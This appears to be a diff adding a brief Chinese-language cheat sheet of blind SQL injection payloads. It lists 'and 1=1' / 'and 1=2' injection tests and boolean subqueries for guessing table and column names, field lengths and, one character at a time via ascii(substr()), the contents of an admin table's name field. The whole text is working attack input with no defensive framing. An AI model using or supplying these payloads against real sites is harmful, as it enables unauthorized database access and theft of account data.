@@ -1,0 +1,16 @@
+判断注入
+and 1=1
+and 1=2
+
+判断表名(有则返回正常，无则返回空)
+and (select count(*) from 表)<>0
+
+判断列名（有则返回正常，无则返回空）
+and (select count(列名) from 表)<>0
+
+判断字段长度(这里为name字段的长度)
+and (select count(*) from admin where length(name)>=5)=1
+
+判断字段9(截断字符串，获取字符ascii码)
+and (select count(*) from admin where ascii(substr(name,1,1))>=9)=1
+关于用法：substr(截取的字符串，截取开始位置，截取长度)
